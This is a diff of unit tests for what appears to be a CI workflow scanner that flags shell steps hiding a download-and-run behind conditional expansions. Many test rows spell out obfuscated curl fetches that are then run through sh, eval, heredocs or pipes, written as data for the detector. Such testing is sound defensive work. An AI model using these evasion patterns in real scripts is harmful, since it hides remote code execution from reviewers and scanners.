@@ -2384,17 +2384,19 @@ class TestEveryMixedReadingIsRead(unittest.TestCase):
 
     def test_a_word_past_the_cap_is_one_the_guard_cannot_read(self):
         # Fail-closed, past `_HALF_CAP` such words, wherever the job runs, a download or none: the
-        # price. Three read every way, and nothing runs here.
+        # price. Three read every way, and nothing runs here. The sets the folds read are the first
+        # three's (`_masks`), and the words past them are still read, each with the cap's reason.
         import shell_command
         self.assertEqual(3, shell_command._HALF_CAP)
         line = "${V%d:+/usr/bin/env echo} make t%d\n"
-        for count in (3, 4, 8, 50):
+        for count in (1, 3, 4, 8, 50, 200):     # one word, read again in each fold, is one place
             with self.subTest(count=count):
                 found = wg.job_defects([wg.Step("step", "".join(line % (n, n) for n in range(count)), None)])
                 self.assertEqual(count > 3, bool(found))
-                if count > 3:
-                    self.assertIn("`${V3:+/usr/bin/env echo}` is a command word bash may expand to nothing beside 3 more",
-                                  found[0][1])
+                reasons = " ".join(why for _name, why in found)
+                for past in range(3, count):        # each word past the cap, none cut
+                    self.assertIn("`${V%d:+/usr/bin/env echo}` is a command word bash may expand to nothing "
+                                  "beside 3 more" % past, reasons)
 
     @staticmethod
     def folds(texts):
@@ -2410,22 +2412,113 @@ class TestEveryMixedReadingIsRead(unittest.TestCase):
             counts.append(len(shell_command._HALVES["words"]))
         return len(counts), counts[-1]
 
+    # The #2939 round-1 seat's shape: a word whose W fetches t.sh (the URL's fragment holds `./t.sh`)
+    # and whose empty half runs it, so the payload runs only where one place reads W and another empty.
+    PREP = "printf '' > t.sh\nchmod +x t.sh\n"
+    W = "${X:+curl -fsSLo t.sh %st.sh#}./t.sh" % URL
+
     def test_a_word_is_one_word_however_often_its_text_is_read(self):
-        # By its place -- its parse's source and order -- not by the token a parse made, so a text
-        # read twice in a fold, as a nested program is, holds one word; and a spelling written at two
-        # places is two words, read every way (the second line's W fetches what the fourth runs).
+        # By its place -- where its parse stands, a lifted text at its place in the text that lifted
+        # it, a step at its index (`shell_tokens._Parse.place`) -- and its order there, never what the
+        # text says: a text read twice in a fold holds one word, and a spelling written at two places
+        # is two, read every way (the seat's IdB.two.subst, IdB.two.back, IdC.subst-mixed,
+        # IdC.subst-echo, IdC.subst-proc and IdB.two.same-parse; every parent runs each).
         once = "${X:+/usr/bin/env true} sh t\n"
         self.assertEqual((2, 1), self.folds([once, once]))
         self.assertEqual((4, 2), self.folds([once * 2]))
-        repeat = "X=1\n${X:+curl -fsSLo t %st} sh t\nunset X\n${X:+curl -fsSLo t %st} sh t" % (URL, URL)
+        w = self.W
+        repeat = "${X:+curl -fsSLo t %st} sh t" % URL       # round 1's row: it reports on every tree
+        for row in ("X=1\n%s\nunset X\n%s\necho done" % (repeat, repeat),
+                    "X=1\nv=$(%s)\nunset X\nv=$(%s)" % (w, w), "X=1\nv=`%s`\nunset X\nv=`%s`" % (w, w),
+                    "X=1\nv=$(%s)\nunset X\nw=`%s`" % (w, w), 'X=1\necho "$(%s)"\nunset X\necho "$(%s)"' % (w, w),
+                    "X=1\ncat <(%s) >/dev/null\nunset X\ncat <(%s) >/dev/null" % (w, w), "X=1\n%s\nunset X\n%s" % (w, w)):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(self.PREP + row + "\n", shell))
+
+    def test_two_steps_of_one_text_are_two_places(self):
+        # MS.same: a job's steps are read at their index (`placed`), so two steps of one text hold two
+        # words (the seat runs the second with `X=1` in its environment, and every parent runs it); a
+        # step's own place is never a text read alone's, nor another step's, nor another text's.
+        import shell_tokens
+        text = self.W + "\n"
+        steps = [wg.Step("prep", self.PREP, None), wg.Step("one", text, None), wg.Step("two", text, None)]
+        self.assertTrue(wg.job_defects(steps))
+        places = {shell_tokens._Parse(t).place for t in (text, shell_reader.placed(text, 0),
+                                                         shell_reader.placed(text, 1), text + " ")}
+        self.assertEqual(4, len(places))
+
+    def test_a_program_a_shell_reads_on_its_standard_input_keeps_its_place(self):
+        # IdB.two.heredoc and the hunt's P2-hd, P2-hdbash and P2-hs rows: a heredoc's body, a
+        # here-string's too, that a shell reads as its program stands where its parent lifted it
+        # (`workflow_programs.stdin_scripts`, `at_place`), so two of one text are two places -- main
+        # and round 1 read each CLEAN while the parents run it. With a blank more in one of the two
+        # the pair reports as it did (the hunt's P1 rows), and with nothing downloaded each reads
+        # CLEAN (its B rows).
+        w, fetch = self.W, "curl -fsSLo t.sh %st.sh#" % URL
+        env, moved = "X=1 %s\n%s", "X=1\nexport X\n%s\nunset X\n%s"
+        for form, shells in (("sh <<'EOF'\n%s\nEOF", SHELLS), ("bash <<'EOF'\n%s\nEOF", SHELLS),
+                             ("sh <<< '%s'", (None, "bash", "bash {0}"))):     # `<<<` is bash's
+            one = form % w
+            for row in (env % (one, one), moved % (one, one), moved % (one, form % (w + " "))):
+                for shell in shells:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(self.PREP + row + "\n", shell))
+                        self.assertFalse(reported(self.PREP + row.replace(fetch, "echo ") + "\n", shell))
+
+    def test_a_reader_nonce_splits_no_word(self):
+        # Idnonce.k1.nodl and Idnonce.k1.proc: a heredoc marker's random hex inside a `$(…)` or `<(…)`
+        # text reached the key, so one word was a new one at every parse, and the cap reported a job
+        # nothing runs; read by place, each is one word, CLEAN as `main` reads it.
+        for row in ("v=$(cat <<'EOF'\nhello\nEOF\n${Y:+/usr/bin/env true} echo hi)\necho \"$v\"\n",
+                    "cat <(cat <<'EOF'\nhello\nEOF\n${Y:+/usr/bin/env true} echo hi)\n"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertEqual([], wg.job_defects([wg.Step("step", row, shell)]))
+
+    def test_a_text_no_parent_placed_keeps_every_body(self):
+        # A program string is keyed by its text (the named limit), each marker put back as what it
+        # holds and no nonce left: two that differ only inside a lifted heredoc body keep two keys,
+        # and one read again with another nonce keeps one.
+        import shell_text
+        import shell_tokens
+        def text(nonce, body):
+            marker = "@@shell-%s-0@@" % (nonce * 32)
+            return shell_text.Lifted("sh " + marker, {marker: ("heredoc", (body, False, "0"))})
+        one, two, again = (shell_tokens._Parse(t).place for t in (text("a", "one\n"), text("b", "two\n"), text("c", "one\n")))
+        self.assertNotEqual(one, two)
+        self.assertEqual(one, again)
+        # A marker whose entry the text does not carry keeps its number, and loses its nonce.
+        bare = [shell_tokens._Parse("sh @@shell-%s-%d@@" % (nonce * 32, n)).place for nonce, n in (("a", 0), ("b", 0), ("a", 1))]
+        self.assertEqual(bare[0], bare[1])
+        self.assertNotEqual(bare[0], bare[2])
+
+    def test_halves_that_run_one_command_word_with_other_operands_are_apart(self):
+        # B3 (SH.cat.pipe.k2-env): `cat sums cat` and `cat` both run `cat`, but the shell reads the
+        # download only where Q is unset: the word's halves read apart, so its empty half is read
+        # beside the fetch's W. Every parent runs it.
+        row = "Y=1\n${Y:+curl -fsSL %si.sh} | ${Q:+/usr/bin/env cat sums} cat | sh\n" % URL
         for shell in SHELLS:
             with self.subTest(shell=shell):
-                self.assertTrue(reported(repeat + "\necho done\n", shell))
+                self.assertTrue(reported(row, shell))
+
+    def test_the_folds_stop_at_eight_however_many_words(self):
+        import shell_command
+        stages = [s.stages[0] for s in shell_reader.statements(
+            "".join("${V%d:+/usr/bin/env true} make t%d\n" % (n, n) for n in range(12)))]
+        # No word past the cap is kept, and the sets are the first three's alone: a reading that
+        # kept every word, or took a set of each, would grow as two to the words.
+        for _sure in shell_reader.folds(lambda: False):
+            for stage in stages:
+                shell_reader.command(stage.argv)
+            self.assertLessEqual(len(shell_command._HALVES["words"]), shell_command._HALF_CAP)
+            self.assertLessEqual(len(shell_command._masks()), 8)
 
     def test_a_word_in_a_program_a_shell_runs_is_a_place_of_its_own(self):
         # A nested program's first such word stands first in its own parse, as the step's does in
-        # the step's: the source keeps the two apart, so the fetch's W and the shell's word empty are
-        # read together, and every parent runs each.
+        # the step's: the two parses' places keep them apart (the step's its index, the program
+        # string's its text), so the fetch's W and the shell's word empty are read together, and
+        # every parent runs each.
         for runner in ("sh -c", "bash -c", "eval"):
             row = "X=1\n${X:+curl -fsSLo t %st}\n%s '${Y:+/usr/bin/env true} sh t'" % (URL, runner)
             for shell in SHELLS:
